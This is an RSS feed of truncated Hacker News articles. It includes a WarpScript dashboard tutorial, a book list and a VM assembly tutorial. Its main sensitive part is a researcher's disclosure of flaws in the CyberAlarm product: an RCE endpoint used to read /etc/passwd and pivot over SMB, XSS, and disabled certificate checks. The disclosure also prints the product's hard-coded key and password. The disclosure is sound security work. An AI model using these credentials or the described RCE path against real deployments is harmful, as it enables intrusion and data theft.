 &nbsp; &nbsp; 'height' 220&nbsp; &nbsp; // Row height in pixels, 220 by default
 &nbsp; &nbsp; 'template' '...' &nbsp; // Custom HTML template
 } </code></pre>



<p>The only mandatory element is <code>tiles</code> which must be associated with a list of tile descriptions. Each tile description if a map with the following elements:</p>



<pre><code>{
 'title' 'Title of the tile' // optional
 'x' 0 // Horizontal position in the grid, between 0 and grid width - optional, defaults to 0.
 'y' 0 // Vertical position in the grid - optional, defaults to 0.
 'w' 1 // Width of the tile in number of grid columns - optional, defaults to 1.
 'h' 1 // Height of the tile in number of grid rows - optional, defaults to 1.
 'options' {} // WarpView specific options - optional (!).
 'type' 'plot' // Type of WarpView tile - optional, defaults to `plot`.
 'endpoint' 'https://sandbox.senx.io/api/v0/exec' // Warp 10 `/api/v0/exec` url - mandatory when 'macro' is set.
 'macro' &lt;% ... %&gt; // WarpScript macro to run to produce data for the tile - use only if 'data' is not set.
 'data' ... // Data to represent in the tile resulting from a WarpScript execution - use only if 'macro' is not set. The content type depends on the type of the tile.
}</code></pre>



<p>The types of tiles you can use are those from the <a href="https://github.com/senx/warpview/wiki" target="_blank" rel="noreferrer noopener">WarpView</a> web component library.</p>



<p>That's it! <strong>You should now be able to create your dashboards</strong>, but to make things even clearer we will walk you through an example.</p>



<h3>Demo dashboard</h3>



<p>The first step is to plan the layout of your dashboard, you can sketch it out quickly on a piece of paper:</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png" alt="outline of your dashboard" width="388" height="242" srcset="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png 1024w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--300x187.png 300w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--768x478.png 768w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29-.png 1124w" sizes="(max-width: 388px) 100vw, 388px"><figcaption>Outline of our dashboard</figcaption></figure></div>



<p>Then create the macro which will define the tiles and call @senx/discovery/render to generate the HTML. In our example, the first line plot will get its data via the <code>data</code> field, the second one via a macro executed on the <a href="https://sandbox.senx.io/" target="_blank" rel="noreferrer noopener">Warp 10 Sandbox</a>.</p>



<p>The resulting WarpScript code for our dashboard is:</p>



<pre><code> &lt;%
 &nbsp; {
 &nbsp; &nbsp; 'tiles' [
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'display'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 3 'h' 1 'x' 3 'y' 0
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' 'Hello Discovery'
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 4 'h' 2 'x' 0 'y' 1
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' [
           NEWGTS 'data' RENAME
           0.0 'v' STORE
           1 500
           &lt;% 1 s * NOW SWAP - NaN NaN NaN $v RAND 0.5 - + DUP 'v' STORE ADDVALUE %&gt;
           FOR
         ]
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 4 'h' 2 'x' 5 'y' 1
 &nbsp; &nbsp; &nbsp; &nbsp; 'endpoint' 'https://sandbox.senx.io/api/v0/exec'
 &nbsp; &nbsp; &nbsp; &nbsp; 'macro' &lt;%
           NEWGTS 'macro' RENAME
           0.0 'v' STORE
           1 500
           &lt;% 1 s * NOW SWAP - NaN NaN NaN $v RAND 0.5 - + DUP 'v' STORE ADDVALUE %&gt;
           FOR
         %&gt;
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'annotation'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 9 'h' 1 'x' 0 'y' 3
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' [&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NEWGTS 'annot1' RENAME 1 500 &lt;% RAND 0.09 &lt; &lt;% NaN NaN NaN T ADDVALUE %&gt; &lt;% DROP %&gt; IFTE %&gt; FOR
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NEWGTS 'annot2' RENAME 1 500 &lt;% RAND 0.09 &lt; &lt;% NaN NaN NaN T ADDVALUE %&gt; &lt;% DROP %&gt; IFTE %&gt; FOR
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NEWGTS 'annot3' RENAME 1 500 &lt;% RAND 0.09 &lt; &lt;% NaN NaN NaN T ADDVALUE %&gt; &lt;% DROP %&gt; IFTE %&gt; FOR
 &nbsp; &nbsp; &nbsp; &nbsp; ]
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; ]
 &nbsp; }
 &nbsp; @senx/discovery/render
 %&gt; </code></pre>



<p>Most of the lines of code are for generating dummy data, not for the dashboard layout itself. Place this WarpScript code in a file <code>prefix/dashboard/demo.mc2</code> in the directory configured via <code>warpscript.repository.directory</code>. The final URL …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.senx.io/truly-dynamic-dashboards-as-code/">https://blog.senx.io/truly-dynamic-dashboards-as-code/</a></em></p>]]>
            </description>
            <link>https://blog.senx.io/truly-dynamic-dashboards-as-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229629</guid>
            <pubDate>Fri, 27 Nov 2020 15:52:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CyberAlarm: An independent security review and why you should avoid it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25229605">thread link</a>) | @todsacerdoti
<br/>
November 27, 2020 | https://paul.reviews/cyberalarm-an-independent-security-review-and-why-you-should-avoid-it/ | <a href="https://web.archive.org/web/*/https://paul.reviews/cyberalarm-an-independent-security-review-and-why-you-should-avoid-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article id="5fbcefde44b88204da4fb1cc">


<figure><img src="https://paul.reviews/content/images/2020/11/cyber-alarm-1.png"></figure><p>Phew! It's been 3 long years since my last article... and I've deliberated over posting this for way too long. &nbsp;But, I feel it's important enough to warrant at least some debate.</p><p>2 months ago, I came across a tweet by Lancashire Police Fraud &amp; Cyber advertising CyberAlarm; a govt-funded tool to help protect companies from cyber attacks.</p><figure><blockquote><div lang="en" dir="ltr"><p>Police CyberAlarm helps small businesses, charities, academia and local authorities get upp-to-date knowledge of cyber attack types and trends which is an absolute key to having a robust defence. </p><p>Businesses can sign up for memeberships at <a href="https://t.co/JTFlQg7yMV">https://t.co/JTFlQg7yMV</a> 🖥️ <a href="https://t.co/bq88tsZYsa">pic.twitter.com/bq88tsZYsa</a></p></div>— Lancs Police Fraud &amp; Cyber (@LancsFraudCyber) <a href="https://twitter.com/LancsFraudCyber/status/1310535084324327425?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote>

</figure><p>Interest piqued, I signed up and awaited my "access code" which is necessary to gain access to the downloads page. Or so I thought.</p><p>A few days later, I was contacted by a Cyber Protect officer from Leicestershire Police who explained there was no download link for the "live" product on the grounds of "data confidentiality". &nbsp;I'm not sure I understand that premise, given it's a product intended for public use... but I digress. &nbsp;Instead, he provided an "installation guide" PDF which outlined how the product worked &amp; how to install it. &nbsp;If I still wanted to proceed, he could provide the access code.</p><p>Here's a segment of the installation guide...</p><figure><img src="https://paul.reviews/content/images/2020/11/1.PNG"></figure><p>--</p><p>Their installation guide suggests running it inside a DMZ (de-militarized zone, an isolated segment from other network assets) or "<strong>on your internal network</strong>".</p><p>For many firms, especially SME, the concept of running a DMZ is alien; with many network assets all joined together with no logical/physical segmentation whatsoever. &nbsp;This is crucial, as isolating potentially dangerous assets (IoT, BYOD devices etc) from your core infrastructure is vital to help prevent attacks travelling across your network.</p><p>Unfortunately, it's likely to be those smaller SMEs without a DMZ who deploy CyberAlarm; in the mistaken belief it's a safe &amp; secure way to mitigate cyber threats.</p><p>If you're going to run <em>anything </em>on your internal network, you must be able to ensure the product is reasonably secure. &nbsp;Faith-based security rarely ends well, so let's dive in.</p><h2 id="installation-">Installation:</h2><p>In the installation guide, they advise you to deploy this on a dedicated machine... which seems reasonable, until they explain why...</p><figure><img src="https://paul.reviews/content/images/2020/11/2.PNG"></figure><p>Disable SELinux?!</p><p>SELinux or "Security-Enhanced Linux" is a mandatory access control (MAC), a vital security tool built into CentOS (based on RedHat Linux). &nbsp;It's designed to protect system administrators from themselves; enforcing strict security policies and ensuring isolation between processes. &nbsp;If it's disabled, poorly-configured or malicious apps/services have root access (aka - total control) over the device.</p><p>NCSC quite rightly state "rooted/jailbroken devices are a threat to sensitive data" (<a href="https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction">https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction</a>), but NPCC are actively pushing a product which requires you to effectively root your device!</p><p>If you take NCSC's advice (and you really should!), this alone is a deal-breaker. &nbsp;The <em>only</em> reason you'd disable a vital security control is because you're too idle/inept to overcome the issue which prompted you to disable it in the first place. &nbsp;If you need further proof of this ridiculous decision, here's an article on the CentOS blog called <a href="https://blog.centos.org/2017/07/dont-turn-off-selinux/">No! Don't turn off SELinux!</a> in which Thomas Cameron, Chief Architect for Red Hat says "Linux is a gun and you know where your foot is".</p><p>Anyway...</p><p>I noticed a screenshot with the download link and without an access code or authentication, I proceeded to download the 2GB virtual machine image and launched it with VMWare Workstation.</p><h3 id="opening-pandora-s-box-">Opening Pandora's box...</h3><p>There's a lot to get through, so I'll summarise as much as possible.</p><h3 id="php-5-4">PHP 5.4</h3><figure><img src="https://paul.reviews/content/images/2020/11/5.png"></figure><p>PHP 5.4 was end of life in September 2015. &nbsp;No more security patches or updates, it's dead and should never be used in a production app. &nbsp;I'll also mention, I put this "phpinfo" file here remotely; it's not part of CyberAlarm.</p><h3 id="remote-network-access-via-rce">Remote Network Access via RCE</h3><p>This one beggars belief. &nbsp;The app has a file called "getmon.php" which literally serves as an RCE (remote command execution) endpoint.</p><figure><img src="https://paul.reviews/content/images/2020/11/4.png"></figure><p>The above image shows me grabbing /etc/passwd from the virtual machine.</p><p>That's bad enough, but what if the attacker is slightly more creative?</p><p>Here, we use the SMB protocol to <strong>connect to another PC inside the network</strong> and grab sensitive data from it.</p><figure><img src="https://paul.reviews/content/images/2020/11/3.png"></figure><p>If you have sensitive data, trade secrets or anything else important on your network, it's now remotely accessible to <em>anyone, anywhere </em>when you view a web page. &nbsp;We haven't placed anything on the network/virtual machine to achieve this either... the attacker is just carrying out commands as if they're sat inside your network.</p><p>Let me be really clear about this. &nbsp;This vulnerability allows a remote attacker to entirely bypass your firewall and exfiltrate <em>any </em>data accessible over your network; you only need to visit a vulnerable web page once.</p><h3 id="cross-site-scripting">Cross Site Scripting</h3><p>Looking through the code, there's no attempt to sanitize (or make safe) any user inputs, so an attacker can remotely inject malicious code into any page on the box. &nbsp;Here, we hijack the "registration" page.</p><figure><img src="https://paul.reviews/content/images/2020/11/6.png"></figure><h3 id="tls-certificate-expiry">TLS certificate expiry</h3><p>It should go without saying, but if your security certificate expires, it's no longer secure.</p><figure><img src="https://paul.reviews/content/images/2020/11/7.png"></figure><h3 id="broken-encryption">Broken Encryption</h3><p>The strongest of door locks is rendered insecure if you leave the key somewhere vulnerable. &nbsp;The same applies in cryptography. &nbsp;It's absolutely vital to generate a cryptographically random key and handle it securely.</p><p>Sadly, CyberAlarm does neither.</p><p>The "key" is static and hard-coded: "P3rv4d3S0ftw4r3"</p><p>Reading between the character substitution, you'll see "Pervade Software" - the developers behind CyberAlarm.</p><p>To make matters worse, they use AES-CBC, which can be implemented securely by a competent developer. &nbsp;Alas here, the weak key and complete lack of MAC (message authentication code) means they cannot trust <em>any </em>of the data they collect.</p><p>A MAC is vital; it allows the recipient to ensure the data hasn't been manipulated during transit. &nbsp;Without it, they're actioning harvested data collected from "data collectors" with <strong>absolutely no guarantee</strong> of its integrity. &nbsp;Far from improving security, I'd argue this makes matters worse. &nbsp;Your reports could be entirely fake or largely contain data you can't act upon; diverting your attention from real risks.</p><h3 id="broken-encryption-part-deux">Broken Encryption &nbsp;- Part Deux</h3><p>One sure-fire way to ensure your product is entirely insecure is to disable all security checks on your certificate, which of course, CyberAlarm does.</p><figure><img src="https://paul.reviews/content/images/2020/11/8.PNG"></figure><p>This means all updates are insecure - allowing an attacker to put <em>anything </em>on the device remotely. &nbsp;Note: I've added the comments in this screenshot to clarify what each line does.</p><h3 id="embedding-server-passwords-in-code-">Embedding server passwords in code!</h3><p>Seriously.</p><p>When the app needs to grab a list of "jobs" or tasks to carry out locally, it logs in with a password of "3jscove".</p><figure><img src="https://paul.reviews/content/images/2020/11/image.png"></figure><p>If you're wondering, the "phash" function is a wrapper for SHA-256; another insecure &amp; unsuitable choice for password hashing.</p><h2 id="insert-record-scratch-sound-here">&lt;insert record scratch sound here&gt;</h2><p>In light of all these failings, I notified Leicestershire Police and awaited their response.</p><p>When it came, I was stunned.</p><p>The link I'd "found" (from their installation guide) was a 2yr old "test" version never intended for public use! &nbsp;Great, it's 2 years old... now your dependencies are only 3 years out of date instead &lt;/sarcasm&gt;</p><p>I'm not about to disclose the entire conversation or the meetings which followed, but when the phrase "no deal breakers" was uttered, I realised this has to go public. &nbsp;In fairness, they have put me in touch with the CTO at Pervade with a view to "making the product better" but after a couple of brief conversations (none of which technical) and despite his candid response, my position now hasn't changed from day one.</p><p>This pilot should be pulled <strong>immediately</strong>. I'd actually go one step further and question how a product with so many simple but critical security flaws could ever be promoted by the Police.</p><h2 id="the-actual-live-version-">The "actual" live version...</h2><p>Following my criticisms over the "old" version, I was given an access code to allow me to download the "live" one.</p><p>Suffice to say, little has changed.</p><p>The code is still woefully insecure, as is the implementation of several core features and in all honesty, I just haven't the time nor motivation to explain why disabling security controls is a bad idea. Sorry Jon.</p><h2 id="obscurity-hides-a-thousand-sins-">Obscurity hides a thousand sins...</h2><p>What I haven't yet mentioned, is the fact that every single line of code in CyberAlarm is encoded/obfuscated using IonCube. &nbsp;By obscuring the code, it prevents any casual observer from uncovering the mess contained within.</p><figure><img src="https://paul.reviews/content/images/2020/11/10.PNG"></figure><p>Thankfully, IonCube is easily reversed (as is any encoding) and offers very little real-world protection. &nbsp;However, CyberAlarm has apparently "passed" a penetration test which, assuming it wasn't carried out by Stevie Wonder, beggars belief.</p><h2 id="summary">Summary</h2><p>CyberAlarm is sadly nothing more than an insecure, poor-designed/engineered wrapper around OpenVAS - an open-source vulnerability assessment scanner.</p><p>I appreciate the forces may disagree with my findings and/or conclusions, however whilst they don't consider any of the above to be "deal breakers", the public are now able to decide if they're willing to entrust their firms security to a product like CyberAlarm.</p><p>If you're in #infosec (even if you're not), I welcome your comments below.</p><h3 id="update-s-">Update(s)</h3><p>25/11/20 3PM: Thanks to Dave Walker on Twitter for pointing out a mistake regarding CentOS. &nbsp;My screenshots show a later build with CentOS 7 / PHP 5.4 so to avoid confusion, I've removed that section. Apologies folks.</p><p>27/11/20 17:30PM: The NPCC have <a href="https://cyberalarm.police.uk/pca-official-response/">published a response</a>, claiming this is "completely untrue". &nbsp;Needless to say, they're entirely wrong... but I've been hearing that story for 2 months. &nbsp;I'll reply here shortly, however for more immediate updates, keep your eyes peeled on <a href="https://twitter.com/paul_reviews">@paul_reviews</a> - where I've already disproven their first claim (they never provided a link to the …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paul.reviews/cyberalarm-an-independent-security-review-and-why-you-should-avoid-it/">https://paul.reviews/cyberalarm-an-independent-security-review-and-why-you-should-avoid-it/</a></em></p>]]>
            </description>
            <link>https://paul.reviews/cyberalarm-an-independent-security-review-and-why-you-should-avoid-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229605</guid>
            <pubDate>Fri, 27 Nov 2020 15:51:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[List of Books for Developers Discounted for Black Friday]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25229602">thread link</a>) | @bojanvidanovic
<br/>
November 27, 2020 | https://devandgear.com/posts/black-friday-books-2020/ | <a href="https://web.archive.org/web/*/https://devandgear.com/posts/black-friday-books-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <header>
          
  
    <h3>
      <a href="https://devandgear.com/books/40-algorithms-every-programmer-should-know/">
        40 Algorithms Every Programmer Should Know
      </a>
    </h3>
  


          
  <p>Hone your problem-solving skills by learning different algorithms and their implementation in Python</p>



          
        </header>

        
          
  <p>
    Learn algorithms for solving classic computer science problems with this concise guide covering everything from fundamental algorithms, such as sorting and searching, to modern algorithms used in machine learning and cryptography
  </p>


        
      </div></div>]]>
            </description>
            <link>https://devandgear.com/posts/black-friday-books-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229602</guid>
            <pubDate>Fri, 27 Nov 2020 15:51:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Get Assembly Superpowers in 7 Minutes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25229404">thread link</a>) | @akully
<br/>
November 27, 2020 | http://adamkulidjian.com/vlahb.html | <a href="https://web.archive.org/web/*/http://adamkulidjian.com/vlahb.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    

    <p>Nov 13, 2019 - <a href="https://github.com/Kully/VLAHB">Github Link</a></p>

    <div>
        <p><img src="http://adamkulidjian.com/imgs/conway2.gif">
        </p>
        <p><img src="http://adamkulidjian.com/imgs/pong2.gif">
        </p>
    </div>

    <br>

    <h2>Scope of Blog</h2>

    <p>To provide a very simple overview of the assembly programming language in <a href="https://github.com/Kully/VLAHB">VLAHB</a> and assembly programming principles in general. Machine code and opcodes is beyond the scope of this blog post.</p>

    <h2>The Brains of the Operation</h2>

    <p>A <b>virtual machine</b> ("vm") acts like a real computer but it only exists within software and not hardware. This means that a virtual machine is not made of physical pieces of etched silicon, printed circuit boards, transistors or capacitors or anything like that. Instead it is "virtual" which means that we program this computer ourselves to do what want: to read and execute binary files according to a blueprint we give it.</p>

    <p>Checkout the file called <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L142-L571">vm.c</a> in <b>VLAHB</b>. See the <b>switch</b> statement and all the <b>case</b> lines? This is code that tells the virtual machine that if it sees an instruction <b>0x0001</b>, do <b>X</b>. If it sees <b>0x0002</b>, do <b>Y</b>, and so on and so forth.</p>


    <h2>Assembly to Binary</h2>

    <p><b>VLAHB</b> is a vm together with an assembly language - let's call it <b>VASM</b> - and an assembler (<i>assembler.py</i>) which converts assembly files (<i>file.asm</i>) to raw machine code (<i>file.bin</i>) that our vm can read and execute.</p>

    <p><img src="http://adamkulidjian.com/imgs/asm_hex_bin_thinarrow.png"></p><p>The process of turning file.asm to file.bin is called <b>assembling</b>.</p>

    <p>Our vm features a special integer called a <b>program counter</b> ("pc") which keeps track of what line the vm is reading at a time. When you tell the vm to run the program <i>myFile.bin</i>, the <b>pc</b> value is assigned to the line number of the program that the vm will begin "reading" (think Turing Machine). The pc is set to this value and then...</p>

    <ul>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        ... and so on
    </ul>
    <p>Nothing is inherently special about these cryptic codes. <b>1002 0003 0000 fde8</b> has no inherent meaning but the vm reads and knows to load the literal 65000 into ram at index 4098.</p>

    <h2>RAM</h2>

    <p>There is a list called <b>ram</b> stored in our virtual machine <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a>. It contains 65535 0's. Each slot of ram holds an integer from 0 to 4294967295. By changing the values in our ram slots we can get super mario to run across the screen, create a paint application, or solve world peace.</p>

    <pre><code>// Empty brackets <b>[ ]</b> represent <b>0</b>
ram := [ ][ ][ ][ ][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 </code></pre>

    

    <p><b>Ram Slot Dedication:</b> this represents how our ram slot are organized

    </p><pre><code>[-----------] [-------] [--] [---------] [---------------------------]
0       4095  4096 4099 4100 4101  27140 27141                   65535 
</code></pre>

    <table>
        <tbody><tr>
            <th>slots in ram</th>
            <th>what they do</th>
        </tr>
        <tr>
            <td>0-4095</td>
            <td>function inputs</td>
        </tr>
        <tr>
            <td>4096-4099</td>
            <td>4 pointers (U,V,Y,Z resp.)</td>
        </tr>
        <tr>
            <td>4100</td>
            <td>return slot for function outputs</td>
        </tr>
        <tr>
            <td>4101-27140</td>
            <td>vram</td>
        </tr>
        <tr>
            <td>27141-65535</td>
            <td>free space</td>
        </tr>
    </tbody></table>

    <h2>Simple Operations</h2>

    <p>The simplest operation to perform on ram is a direct load. This loads a value into a slot of ram.</p>

    <p>
    <b> Ex. 1 </b></p><pre><code>LD R[3] 2  // load 2 into the slot of ram at index 3
</code></pre>

    <pre><code>
ram := [ ][ ][ ][2][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
    </code></pre>

    <p>There are other ways to manipulate ram. <b>VASM</b> handles all the basic operations <b>+</b>, <b>-</b>, <b>×</b>, <b>÷</b></p>

    <p>
    <b>Ex. 2</b></p><pre><code>ADD R[1] 8     // ram[1] = ram[1] + 8
SUB R[2] R[1]  // ram[2] = ram[2]-ram[1]
MUL R[2] 5     // ram[2] = ram[2] * 5</code></pre>

    <hr>

    <p><b>Exercise 1</b> What happens to ram after compiling this assembly code and running it in vm?
    <br><i>(assume <b>ram</b> is initialized as an array of 0s)</i></p><pre><code>LD R[2] 2
MUL R[2] 2
LD R[69] 3
MUL R[2] R[3]
EXIT</code></pre>


    <h2>Labels</h2>

    <p>Our assembly language supports a primitive to functions called <b>LABELS</b>. When assembly code is compiled down to machine instructions for the virtual machine, labels don't appear in the code. Instead they are treated as markers in the code where you can loop to, jump to, etc. Therefore it is better to write <b>GOTO MY_FIRST_LABEL</b> rather than something like <b>GOTO 1729</b>.</p>

    <pre><code>MATH_ADD_TWO_NUMBERS:
LD R[4100] R[0]
ADD R[4100] R[1]  // store the sum of R[0] and R[1] into R[4100]
RETURN
</code></pre>

    <p><i>Q. Why are we storing stuff in <b>R[4100]</b>?</i></p><p>

    <i>A. Our function output is by convention stored at <b>R[4100]</b>. We could have picked <b>R[1729]</b>.</i></p><p>To jump the pc to a label, call it with the <b>CALL</b> opcode. This pushes the current pc to the <b>stack</b> - a stack in the CPU - and the pc is set to the line where the label is</p>

    <p><b>RETURN</b>: this <b>pops</b> the pc from the stack and sets the pc to that popped value. If we write something like the code snippet below then ram will not be touched.</p>



    <pre><code>CALL WHAT_IS_LIFE
EXIT

// we never go here
LD R[0] 55
LD R[1] 51
LD R[2] 44

WHAT_IS_LIFE:
    RETURN
</code></pre>


    <p><i>But why?</i> Once we hit <b>CALL WHAT_IS_LIFE</b>, the pc will be pushed, and the pc jumps to <b>WHAT_IS_LIFE</b>. The stack and pc now looks like this:</p>

    <pre>    stack = [0]
    pc = 0
    </pre>

    <p>In the next line we hit a <b>RETURN</b>, which means we <b>pop</b> from the stack and assign our pc to that value.</p>

    <pre>    stack = [ ]
    pc = 0
    </pre>

    <p>Now we advance a line to the second line of our program and hit <b>EXIT</b>. The vm exits.</p>
    
    <hr>

    <p><b>Exercise 2</b> Describe in your own words what the program below is doing to ram.

    </p><pre><code>LD R[0] 3
LD R[1] 4
CALL DO_SOMETHING
EXIT

DO_SOMETHING:
    LD R[4100] R[0]
    ADD R[4100] R[1]
    RETURN
</code></pre>


    <h2>Pointers</h2>

    <p>Let's say you want to be able to programmatically place values in ram with assembly. Let's say for instance you want to put 7 in R[3], 7 in R[6], and 7 in R[9].</p>

    <p>Notice that our index of ram is a multiple of 3 each time: 3, 6, 9. We can write</p>

    <pre><code>LD R[3] 7
LD R[6] 7
LD R[9] 7
</code></pre><p>

    but with a pointer:

    </p><pre><code>LD R[4096] 3  // pointer U
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 6
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 9
LD R[U] 7
</code></pre>


    <p><i>How does this work?</i></p><p>
        A <b>pointer</b> refers to a slot of ram that the vm treats in a _special_ way. The word _special_ refers to vm interpreting that value as an index of ram. <b>VLAHB</b> has 4 hard-coded slots for pointers, located at ram slots <b>R[4096]</b>, <b>R[4097]</b>, <b>R[4098]</b> and <b>R[4099]</b>, with the designated letters <b>U</b>, <b>V</b>, <b>Y</b>, <b>Z</b> respectively.
    </p>

    <table>
        <tbody><tr>
            <th>letter</th>
            <th>ram slot</th>
        </tr>
        <tr>
            <td>U</td>
            <td>R[4096]</td>
        </tr>
        <tr>
            <td>V</td>
            <td>R[4097]</td>
        </tr>
        <tr>
            <td>Y</td>
            <td>R[4098]</td>
        </tr>
        <tr>
            <td>Z</td>
            <td>R[4099]</td>
        </tr>
    </tbody></table>

    <br>

    <div><p>
        Look at the first two lines of asm code above. We first load 3 into 4096. The second line is <b>LD R[U] 7</b>. This tells the program to load a 7 into the ram[ram[4096]]. </p><p> Since ram[4096] = 3, we are loading 7 into ram[3].
    </p></div>

    <pre><code>ram := [0][0][0][7][0][0][0][0]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
</code></pre>

    <p><b>NB</b> There are more opcodes built into <b>VLAHB</b> that use pointers. Checkout <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a> to see them all.

    </p><hr>

    <p><b>Exercise 3</b> The code snippet below loads the integer <b>7</b> into slots 120 to 130 inclusive. Rewrite the code below using the opcode <b>LD R[U] R[V]</b>.

    </p><pre><code>LD R[120] 7
LD R[121] 7
LD R[122] 7
LD R[123] 7
LD R[124] 7
LD R[125] 7
LD R[126] 7
LD R[127] 7
LD R[128] 7
LD R[129] 7
LD R[130] 7
</code></pre>


    <h2>Conditional Opcodes</h2>

    <p>A subset of opcodes are called <b>conditional</b> and can result in the pc skipping the next line of assembly code (that's +2 lines in machine code since each valid assembly line maps to exactly 2 lines of machine code after it's compiled). These opcodes compare one value with another. These opcodes are called conditional because they may jump over an extra line of assembly depending on some condition.</p>

    <p>For example <b>CMP R[0] 2</b> checks if ram[0] is equal to 2. If it is, skip next line. Else, do nothing. Read the example below carefully</p>

    <pre><code>LD R[0] 4
LD R[1] 0

CMP R[0] 8  // if R[0] == 8, skip next line
LD R[1] 1
EXIT  // R[1]=1 at end of program
</code></pre>

    <table>
        <tbody><tr>
            <th>opcode</th>
            <th>meaning</th>
        </tr>
        <tr>
            <td>CMP</td>
            <td>is equal to</td>
        </tr>
        <tr>
            <td>LT</td>
            <td>less than, &lt;</td>
        </tr>
        <tr>
            <td>LTE</td>
            <td>less than or equal, &lt;=</td>
        </tr>
        <tr>
            <td>GT</td>
            <td>greater than, &gt;</td>
        </tr>
        <tr>
            <td>GTE</td>
            <td>greater than or equal, &gt;=</td>
        </tr>
    </tbody></table>

    <hr>

    <p><b>Exercise 4</b> What is loaded into slot <b>R[33]</b> when the program hits <b>EXIT</b>?</p>

    <pre><code>LD R[0] 3
LD R[33] 0

CMP R[0] 2
ADD R[33] 1
GTE R[0] 2
ADD R[33] 1
ADD R[33] 2

EXIT
</code></pre>

    <h2>VRAM</h2>

    <p>A subset of our ram slots are dedcated to pixels for the 160X144 px display. This happens to be the same resolution of the original Game Boy. The choice of vram slots is arbitrary so we'll pick slots from ram[4101] to ram[27140] inclusive. These slots map onto the screen from top to bottom, left to right, starting with the top-left pixel.</p>

    <p>An int stored in vram is interpreted as an rgba color. It is easier to load a hexidecmial integer as it's easier to read what color you are loading.</p>

    <p><b> Ex. 1 </b> red pixel in top left corner</p>

    <pre><code>// let's place a red pixel at the top-left corner

LD R[4101] 0XFF0000FF // rgba(255,0,0,255)
BLIT  // this draws the screen

INFINITE_LOOP:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP  // loop forever so we can see the red dot
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_1px.png"></p><p><b> Ex. 2 </b> red, green, blue pixels in top left corner</p>

    <pre><code>LD R[4101] 0XFF0000FF // red
LD R[4102] 0X00FF00FF // green
LD R[4103] 0X0000FFFF // blue
BLIT

INFINITE_LOOP_2:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP_2  // loop forever
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_3px.png"></p><h2>Write an Assembly Game</h2>

    <ul>
        <li>Clone the repo from <a href="https://github.com/Kully/VLAHB">Github</a></li>
        <li>Read <a href="https://github.com/Kully/VLAHB/blob/master/README.md">README.md</a></li>
    </ul>

    <h4>Tips</h4>

    <ol>
